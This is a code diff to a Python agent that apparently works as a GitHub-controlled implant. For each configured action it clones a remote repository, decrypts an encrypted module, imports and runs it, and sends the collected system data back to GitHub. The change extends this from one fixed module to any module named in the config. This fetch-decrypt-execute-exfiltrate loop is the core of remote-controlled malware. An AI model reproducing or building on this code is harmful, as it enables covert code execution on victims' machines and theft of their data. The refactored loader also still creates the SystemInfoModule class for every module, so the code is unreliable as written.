@@ -3,9 +3,9 @@ import os
 import sys
 import git
 import shutil
+import importlib
 from github_connector import GitHubConnector
 from encryption import Encryption
-from cryptography.fernet import Fernet
 
 class Agent:
     def __init__(self):
@@ -25,33 +25,31 @@ class Agent:
 
     def execute_actions(self, config):
         for action in config:
-            if action["module"] == "system_info":
-                module_name = action["module"]
-                # Clone the repository to a local directory
-                local_directory = "temp_directory"
-                repo = git.Repo.clone_from(self.repository_url, local_directory)
-                # Decrypt the module file
-                self.encryption.decrypt_file(f"{local_directory}/modules/{module_name}.py", f"{local_directory}/modules/{module_name}_decrypted.py")
+            module_name = action["module"]
+            # Clone the repository to a local directory
+            local_directory = "temp_directory"
+            repo = git.Repo.clone_from(self.repository_url, local_directory)
+            # Decrypt the module file
+            self.encryption.decrypt_file(f"{local_directory}/modules/{module_name}.py", f"{local_directory}/modules/{module_name}_decrypted.py")
 
-                try:
-                    # Add the local directory to the system path for module import
-                    sys.path.append(os.path.join(os.path.dirname(__file__), "temp_directory"))
+            try:
+                # Add the local directory to the system path for module import
+                sys.path.append(os.path.join(os.path.dirname(__file__), "temp_directory"))
 
-                    # Import the module and perform the necessary actions
-                    import modules.system_info_decrypted as system_info_module
-                    system_info_module = system_info_module.SystemInfoModule()
-                    data = system_info_module.collect_data()
-                    # Remove the local directory
-                    repo.close()
-                    shutil.rmtree(local_directory)
-                    ## encrypted_data = self.encryption.encrypt(data)
-                    ## self.github_connector.log_data(encrypted_data)
-                    self.github_connector.log_data(data)
-                except ImportError:
-                    print(f"Error importing module: {module_name}")
-                except Exception as e:
-                    print(f"Error executing module: {module_name}. Error message: {str(e)}")
-
+                # Import the module and perform the necessary actions
+                module = importlib.import_module(f"modules.{module_name}_decrypted")
+                module = module.SystemInfoModule()
+                data = module.collect_data()
+                # Remove the local directory
+                repo.close()
+                shutil.rmtree(local_directory)
+                ## encrypted_data = self.encryption.encrypt(data)
+                ## self.github_connector.log_data(encrypted_data)
+                self.github_connector.log_data(data)
+            except ImportError:
+                print(f"Error importing module: {module_name}")
+            except Exception as e:
+                print(f"Error executing module: {module_name}. Error message: {str(e)}")
 
 if __name__ == "__main__":
     agent = Agent()
